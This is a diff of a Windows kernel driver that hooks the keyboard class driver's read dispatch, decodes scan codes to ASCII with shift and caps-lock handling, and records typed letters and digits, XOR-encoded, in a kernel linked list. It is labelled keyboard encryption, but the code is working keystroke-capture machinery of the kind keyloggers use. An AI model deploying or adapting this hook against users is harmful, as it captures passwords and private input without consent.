@@ -14,8 +14,9 @@ extern "C"{
 	PDRIVER_DISPATCH g_OriKbdclassReadDispatch = NULL;
 	PIO_COMPLETION_ROUTINE g_OriKbdclassCompleteRoutineOfReadDispatch = NULL;
 	ULONG g_IrpPendingNum = 0;
+	ULONG g_ExtensionKeyWord = 0;		// 用来记录ctrl或alt这种组合键是否被按下
 
-
+	
 	NTSTATUS InstallKbdclassIrpHook()
 	{
 		NTSTATUS status = STATUS_SUCCESS;
@@ -90,6 +91,18 @@ extern "C"{
 
 
 	unsigned char asciiTbl[] = {
+		/*
+		0x00, 
+		Esc, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, -, =, backspace, 
+		tab,q, w, e, r, t, y, u, i, o, p, [, ], enter, 0x00, 
+		a, s, d, f, g, h, j, k, l, ;, ', `, 0x00, \, 
+		z, x, c, v, b, n, m, ,, ., /, 0x00, 
+		Shift(Left), 0x00, space, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+		7, 8, 9, -, 
+		4, 5, 6, =, 
+		1, 2, 3, 
+		0, .,
+		 */
 		0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09,	//normal
 		0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x5B, 0x5D, 0x0D, 0x00, 0x61, 0x73,
 		0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x7A, 0x78, 0x63, 0x76,
@@ -121,10 +134,11 @@ extern "C"{
 #define	S_CAPS				2
 #define	S_NUM				4
 	static int kb_status = S_NUM;
-	void __stdcall print_keystroke(UCHAR sch)
+	int		asciiTblOffset = 0;
+	UCHAR __stdcall GetMakeCodeAscii(UCHAR sch)
 	{
 		UCHAR	ch = 0;
-		int		off = 0;
+
 
 		// 当按下一键时，产生 mark 码
 		// 放开键时，产生 break 码
@@ -132,40 +146,39 @@ extern "C"{
 		// http://www.voidcn.com/article/p-syxmbgac-sm.html
 		// https://wenku.baidu.com/view/bee9427c168884868762d6f3.html
 
+
+
+		if (kb_status & S_SHIFT && kb_status & S_CAPS)
+		{
+			asciiTblOffset = 84 * 3;
+		}
+		else
+		{
+			if (kb_status & S_SHIFT)
+			{
+				asciiTblOffset = 84 * 2;
+			}
+			else if (kb_status & S_CAPS)
+			{
+				asciiTblOffset = 84;
+			}
+			else
+			{
+				asciiTblOffset = 0;
+			}
+		}
+
 		if ((sch & 0x80) == 0)	//make
 		{
-			if ((sch < 0x47) ||
-				((sch >= 0x47 && sch < 0x54) && (kb_status & S_NUM))) // Num Lock
+			if ((sch < 0x47) || // 主键盘
+				((sch >= 0x47 && sch < 0x54) && (kb_status & S_NUM))) // Num Lock 小键盘 数字键盘
 			{
-				ch = asciiTbl[off + sch];
-			}
-
-			switch (sch)
-			{
-			case 0x3A:
-				kb_status ^= S_CAPS;
-				break;
-
-			case 0x2A:
-			case 0x36:
-				kb_status |= S_SHIFT;
-				break;
-
-			case 0x45:
-				kb_status ^= S_NUM;
+				ch = asciiTbl[asciiTblOffset + sch];
 			}
 		}
-		else		//break
-		{
-			if (sch == 0xAA || sch == 0xB6)
-				kb_status &= ~S_SHIFT;
-		}
 
-		if (ch >= 0x20 && ch < 0x7F)
-		{
-			DbgPrint("%C \n", ch);
-		}
 
+		return ch;
 	}
 
 
@@ -184,24 +197,81 @@ extern "C"{
 
 			for (int i = 0; i < keywordNum; i++)
 			{
+				// 大部分键盘按下状态是key_make 抬起为break
 
-				KdPrint(("ScanCode: %x", kbdData->MakeCode));
-				KdPrint((" %s\n", kbdData->Flags ? "UP" : "DOWN"));
-				print_keystroke((UCHAR)kbdData->MakeCode);
 
-				// 只记up
-				if (!kbdData->Flags)
-				{				
-					// 记录到链表
-					PKEYBOARDINFO keyboardInfo = (PKEYBOARDINFO)ExAllocatePoolWithTag(NonPagedPool, sizeof(KEYBOARDINFO), KBDTAG);
+				// 有的键盘按下是 key_e0 | key_make
+				// 抬起是 key_e0 | key_break 如右边的ctrl 和 alt
 
-					keyboardInfo->makecode = kbdData->MakeCode;
-					keyboardInfo->encryptoValue = kbdData->MakeCode ^ 0xFFFF;
+				if (kbdData->Flags & KEY_BREAK)
+				{
+					KdPrint(("KeyboardEncrypt ScanCode: %x\n", kbdData->MakeCode));
 
-					InsertHeadList(&g_KbdInfoList, &keyboardInfo->listentry);
+					switch (kbdData->MakeCode)
+					{
+					case 0x3A:
+						kb_status ^= S_CAPS;
+						break;
+
+					case 0x2A:
+					case 0x36:
+						kb_status &= ~S_SHIFT;
+						break;
+
+					case 0x45:
+						kb_status ^= S_NUM;
+					}
+
+
+					if (kbdData->MakeCode == 0x1d || kbdData->MakeCode == 0x38)
+					{
+						// ctrl alt
+
+						g_ExtensionKeyWord = 0;
+					}
+
+					// 快捷键这种的被按下时，不记录键盘
+					if (!g_ExtensionKeyWord)
+					{
+						// 只记录字母和数字
+						if ((kbdData->MakeCode >= 0x10 && kbdData->MakeCode <= 0x19) ||				// q -- p
+							(kbdData->MakeCode >= 0x1E && kbdData->MakeCode <= 0x26) ||				// a -- l
+							(kbdData->MakeCode >= 0x2C && kbdData->MakeCode <= 0x32) ||				// z -- m
+							(kbdData->MakeCode >= 0x2 && kbdData->MakeCode <= 0xB) )				// 1 -- 0
+						{
+							// 记录到链表
+							PKEYBOARDINFO keyboardInfo = (PKEYBOARDINFO)ExAllocatePoolWithTag(NonPagedPool, sizeof(KEYBOARDINFO), KBDTAG);
+
+							UCHAR asciiCode = GetMakeCodeAscii((UCHAR)kbdData->MakeCode);
+
+							keyboardInfo->makecode = kbdData->MakeCode;
+							keyboardInfo->encryptoValue = asciiCode ^ 0xFFFF;
+
+							InsertHeadList(&g_KbdInfoList, &keyboardInfo->listentry);
+						}
+
+
+					}
+
 				}
+				else
+				{
+					if ((UCHAR)kbdData->MakeCode == 0x2a || (UCHAR)kbdData->MakeCode == 0x36)
+					{
+						kb_status |= S_SHIFT;
+					}
+
+					if (kbdData->MakeCode == 0x1d || kbdData->MakeCode == 0x38)
+					{
+						// ctrl alt
+
+						g_ExtensionKeyWord = 1;
+					}
+				}
+
+
 				// 修改
-				kbdData->MakeCode = 0x31; // 'A'
+				// kbdData->MakeCode = 0x31; // 'n'
 			}
 
 		}
